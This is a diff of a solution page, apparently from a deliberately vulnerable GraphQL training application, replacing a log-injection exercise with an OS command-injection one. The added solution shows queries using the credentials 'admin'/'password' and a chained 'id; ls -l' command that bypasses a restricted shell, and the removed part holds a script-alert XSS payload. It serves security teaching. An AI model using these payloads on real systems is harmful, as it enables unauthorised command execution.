@@ -1,36 +1,47 @@
 <!-- Start -->
-<h3 style="color:purple" id="inj-log"><b>Injection :: Log Injection</b></h3>
+<h3 style="color:purple" id="exec-os-2"><b>Code Execution :: OS Command Injection #2</b></h3>
 <hr />
 <h5>Problem Statement</h5>
 <p>
-  GraphQL actions such as <code>mutation</code> and <code>query</code> have the ability to take an <code>operation name</code> as part of the query.
-  Here is an example query that uses <code>MyName</code> as an operation name:
-  <pre>query MyName {
-    getMyName
-    {
-      first
-      last
-    }
-  } </pre></p>
-  <p>The application is keeping track of all queries and mutations users are executing on this system in order to display them in the audit log.</p>
-  <p>However, the application is not doing a fair job at verifying the operation name.</p>
+  The query <code>systemDiagnostics</code> accepts certain UNIX binaries as parameters for debugging purposes, such as
+  <code>whoami</code>, <code>ps</code>, etc. It acts as a restricted shell. However, it is protected
+  with a username and password. After obtaining the <a href="http://127.0.0.1:5000/solutions#misc-weakpass">correct
+  credentials</a>, the restricted shell seems to be bypassable by chaining commands together.
+</p>
 <h5>Resources</h5>
 <ul>
   <li>
-    <a href="https://cwe.mitre.org/data/definitions/117.html" target= "_blank">
-      <i class="fa fa-newspaper"></i> CWE-117: Improper Output Neutralization for Logs
+    <a href="https://www.netsparker.com/blog/web-security/command-injection-vulnerability/" target="_blank">
+      <i class="fa fa-newspaper"></i> Netsparker - Command Injection
     </a>
   </li>
 </ul>
-<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-inj-log')">Show</button></h5>
-<div id="sol-inj-log" style="display:none">
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-exec-os-2')">Show</button></h5>
+<div id="sol-exec-os-2" style="display:none">
   <pre class="bash">
-    # Spoof the operation conducted to getPaste instead of createPaste
-    mutation getPaste{
-      createPaste(title:"&lt;script&gt;alert(1)&lt;/script&gt;", content:"zzzz", public:true) {
-        pasteId
-      }
-    }
-  </pre>
+# System Diagnostics suffers from weak restricted shell implementation
+
+query {
+  systemDiagnostics(username:"admin", password:"password", cmd:"id")
+}
+
+>>> Response:
+{
+  "data": {
+    "systemDiagnostics": "id: command not found"
+  }
+}
+
+
+query {
+  systemDiagnostics(username:"admin", password:"password", cmd:"id; ls -l")
+}
+
+>>> Response:
+{
+  "data": {
+    "systemDiagnostics": "total 128\ndrwxr-xr- .. COLORTERM=truecolor\n_=/usr/bin/env\n"
+  }
+}</pre>
 </div>
 <!-- End -->
